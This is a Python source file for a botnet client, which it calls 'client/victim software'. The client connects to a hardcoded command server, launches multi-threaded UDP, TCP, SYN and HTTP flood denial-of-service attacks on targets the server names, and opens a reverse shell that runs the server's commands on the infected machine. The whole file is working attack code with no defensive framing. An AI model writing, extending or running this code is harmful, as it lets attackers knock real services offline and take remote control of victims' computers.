#!/usr/bin/env python3

"""planet.py: The milkyway client/victim software."""

# import libraries
import multiprocessing
import os
import random
import socket
import subprocess
import sys
import time
from threading import Thread
from signal import SIGINT, signal

# get platform
if sys.platform in ("linux", "linux2"):
    planet_os = "linux"
elif sys.platform == "darwin":
    planet_os = "mac"
elif sys.platform == "win32":
    planet_os = "windows"
    import ctypes
else:
    print("This platform is unsupported.")
    os._exit(0)


# functions
def ddos_udp(target_ip, target_port):
    """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
    global requests_sent
    while planet_attacking:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((str(target_ip), int(target_port)))
            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
            s.close()
            requests_sent += 1
        except IOError:
            time.sleep(10)


def ddos_tcp(target_ip, target_port):
    """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
    global requests_sent
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while planet_attacking:
        try:
            s.connect((str(target_ip), int(target_port)))
            s.setblocking(0)
            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
            requests_sent += 1
        except IOError:
            time.sleep(10)
    if "s" in locals():
        s.close()


def ddos_syn(target_ip, target_port):
    """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
    global requests_sent
    while planet_attacking:
        try:
            s = socket.socket()
            s.connect((str(target_ip), int(target_port)))
            s.close()
            requests_sent += 1
        except IOError:
            time.sleep(10)
    if "s" in locals():
        s.close()


def ddos_http(target_ip, target_port):
    """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
    global requests_sent
    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    while planet_attacking:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target_ip), int(target_port)))
            s.sendto(
                (f"GET /{target_ip} HTTP/1.1\r\n").encode("ascii"),
                (str(target_ip), int(target_port)),
            )
            s.sendto(
                (f"Host: {src_ip} \r\n\r\n").encode("ascii"),
                (str(target_ip), int(target_port)),
            )
            s.close()
            requests_sent += 1
        except IOError:
            time.sleep(10)


def exit_handler(*args):
    """Ensure a smooth and safe exit."""
    global planet_online, planet_shutting_down, planet_attacking
    planet_shutting_down = True
    if planet_online:
        planet_socket.send(f"planet ID: {planet_id} offline".encode())
    planet_online = False
    planet_attacking = False
    planet_socket.close()
    print("Exiting...")
    os._exit(0)


def connect_to_galaxy():
    """Connect to galaxy."""
    global planet_socket, planet_online
    while not planet_online:
        try:
            print("Connecting to galaxy...")
            planet_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            planet_socket.connect((galaxy_ip, galaxy_port))
            print("Successfully connected to galaxy.")
            planet_online = True
        except Exception:
            print("Cannot connect to galaxy. Retrying in 5 seconds...")
            time.sleep(5)


def shell(shell_buf_size):
    """Process incoming reverse shell commands from galaxy."""
    shell_socket = socket.socket()
    shell_socket.connect((galaxy_ip, shell_port))
    cwd = os.getcwd()
    shell_socket.send(cwd.encode())
    while not planet_shutting_down:
        shell_cmds = []
        shell_cmd = shell_socket.recv(shell_buf_size).decode()
        if shell_cmd.lower() == "exit":
            break
        if "&&" in shell_cmd and ";" not in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
        elif ";" in shell_cmd and "&&" not in shell_cmd:
            shell_cmds = shell_cmd.split(";")
        elif "&&" in shell_cmd and ";" in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
            for i, possible_cmd in enumerate(shell_cmds):
                if ";" in possible_cmd:
                    shell_cmds[i] = possible_cmd.split(";")
        if not shell_cmds:
            if shell_cmd[:2].lower() == "cd":
                new_shell_cmd = shell_cmd.replace("cd ", "", 1).strip()
                try:
                    os.chdir(new_shell_cmd)
                except FileNotFoundError:
                    output = f"Directory {new_shell_cmd} not found."
                else:
                    output = ""
            else:
                output = subprocess.getoutput(shell_cmd.strip())
        else:
            for shell_list_cmd in shell_cmds:
                if shell_list_cmd[:2].lower() == "cd":
                    new_shell_list_cmd = shell_list_cmd.replace("cd ", "", 1).strip()
                    try:
                        os.chdir(new_shell_list_cmd)
                    except FileNotFoundError:
                        output = f"Directory {new_shell_list_cmd} not found."
                    else:
                        output = ""
                else:
                    output = f"{output}\n{subprocess.getoutput(shell_list_cmd.strip())}"
        cwd = os.getcwd()
        message = f"{output}<sep>{cwd}"
        shell_socket.send(message.encode())
    if planet_shutting_down:
        shell_socket.send("shutting down".encode())
    shell_socket.close()


def connection_handler():
    """Handle commands coming from galaxy, and keep planet connected to galaxy."""
    global planet_online, planet_id, planet_attacking
    while not planet_shutting_down:
        while planet_online:
            try:
                data = planet_socket.recv(1024).decode("ascii").lower()
                print(data)
                if "ddos" in data:
                    data = data.replace("ddos ", "").strip().split()
                    if "stop" in data:
                        print("Recieved stop DDoS command.")
                        planet_attacking = False
                        continue
                    else:
                        print("Recieved DDoS command.")
                    target_ip, target_port, flood_type = data
                    attack_thread_count = int(planet_threads) * 2
                    if planet_os == "windows":
                        system_limits = int(ctypes.windll.msvcrt._getmaxstdio())
                    else:
                        system_limits = int(os.popen("/usr/bin/ulimit -n").read().strip())
                    if attack_thread_count >= system_limits:
                        attack_thread_count = system_limits - 128
                    planet_attacking = True
                    Thread(target=ddos_check_reqs).start()
                    if flood_type == "udp":
                        for _ in range(attack_thread_count):
                            Thread(target=ddos_udp, args=(target_ip, target_port)).start()
                    elif flood_type == "http":
                        for _ in range(attack_thread_count):
                            Thread(target=ddos_http, args=(target_ip, target_port)).start()
                    elif flood_type == "syn":
                        for _ in range(attack_thread_count):
                            Thread(target=ddos_syn, args=(target_ip, target_port)).start()
                    else:
                        for _ in range(attack_thread_count):
                            Thread(target=ddos_tcp, args=(target_ip, target_port)).start()
                    planet_socket.send(f"planet ID: {planet_id} attacking".encode())
                    print(
                        f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type})"
                    )
                elif "planet ID: " in data:
                    planet_id = data.replace("planet ID: ", "").strip()
                    print(f"Recieved planet ID: {planet_id}")
                    print(data)
                elif "shellcmd start bufsize " in data:
                    planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                    shell(int(data.replace("shellcmd start bufsize ", "").strip()))
            except IOError as e:
                print("Having trouble connecting to galaxy, attempting to reconnect...")
                print(f"Error: {e}")
                planet_online = False
                connect_to_galaxy()
            time.sleep(1)
        planet_attacking = False


def ddos_check_reqs():
    """Calculate DDoS requests per second."""
    while planet_attacking:
        old_requests_sent = requests_sent
        time.sleep(5)
        requests_sent_5_sec = requests_sent - old_requests_sent
        requests_sent_1_sec = requests_sent_5_sec / 5
        print(f"Requests Per Second: {requests_sent_1_sec}")


# exit handler
signal(SIGINT, exit_handler)


# variables
galaxy_ip = "192.168.1.2"
galaxy_port = 9999
shell_port = 10000
planet_threads = multiprocessing.cpu_count()
planet_id = ""
planet_attacking = False
planet_online = False
planet_shutting_down = False
requests_sent = 0


# connect to galaxy
connect_to_galaxy()
Thread(target=connection_handler).start()
